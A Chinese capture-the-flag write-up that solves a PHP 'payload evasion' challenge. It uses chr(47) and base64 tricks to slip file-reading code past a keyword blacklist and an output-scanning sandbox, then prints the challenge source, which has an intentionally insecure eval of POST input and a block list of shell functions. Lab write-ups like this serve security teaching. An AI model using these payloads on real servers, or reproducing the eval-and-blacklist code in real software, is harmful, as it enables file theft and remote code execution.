# 内网渗透与高级社工-免杀payload制作-G3 WriteUp

这一关考查沙箱逃逸，但说真的，你甚至可以使用G1的payload来读取到/flag

```
readfile(chr(47).'fl'.'ag');
```

这很奇怪，让我们看看源码

## 源码定位

输入payload读取工作目录：

```php
echo getcwd();
```

确认了当前工作目录是`/var/www/html`

输入payload读取工作目录下的文件：

```php
print_r(scandir(getcwd()));
```

输出

```
Array
(
    [0] => .
    [1] => ..
    [2] => index.php
)
```

确认源码路径为`/var/www/html/index.php`

输入payload读取页面源码

```php
readfile(getcwd().chr(47).'index.php');
```

终于提示了“沙箱阶段被终止”，而非一般的“未通过校验”

输入payload读取base64编码后的源码

```php
echo base64_encode(file_get_contents(getcwd().chr(47).'index.php'));
```

解码后获取源码：

```php
<?php
// 载荷检测系统 —— 静态关键词黑名单 + 沙箱动态检测 + 执行
// flag 不硬编码于此；通过检测的载荷读取 /flag 后回显。

$code = $_POST['code'] ?? '';
$verdict = null;   // null | blocked_static | blocked_sandbox | passed
$output = '';

$blacklist = ['system', 'exec', 'shell_exec', 'passthru', 'popen', 'proc_open',
              'cat', 'flag', '/', '|', '`', '$', '>', '<'];

if ($code !== '') {
    // 第一层：静态关键词检测
    $blocked = false;
    foreach ($blacklist as $kw) {
        if (strpos($code, $kw) !== false) {
            $blocked = true;
            break;
        }
    }

    if ($blocked) {
        $verdict = 'blocked_static';
    } else {
        // 第二层：沙箱动态检测（隔离试运行，观察输出行为）
        putenv('SANDBOX=1');
        ob_start();
        try {
            eval($code);
        } catch (Throwable $e) {
        }
        $sandbox_out = ob_get_clean();
        putenv('SANDBOX');

        if (strpos($sandbox_out, 'flag{') !== false) {
            $verdict = 'blocked_sandbox';
        } else {
            // 通过检测，真实环境执行
            ob_start();
            try {
                eval($code);
            } catch (Throwable $e) {
                echo '执行出错';
            }
            $output = ob_get_clean();
            $verdict = 'passed';
        }
    }
}
?>
// 略
```

观察沙箱逻辑：

```php
if (strpos($sandbox_out, 'flag{') !== false) {
            $verdict = 'blocked_sandbox';
}
```

原来是检测输出中是否含有`flag{`，如果有则判定为恶意程序，阻止执行。

但/flag里的内容是`vmc{}`啊喂，所以这个沙箱检测根本没用。

对于正确执行此逻辑的沙箱检测，可以使用base64编码输出，像以上的源码读取payload一样。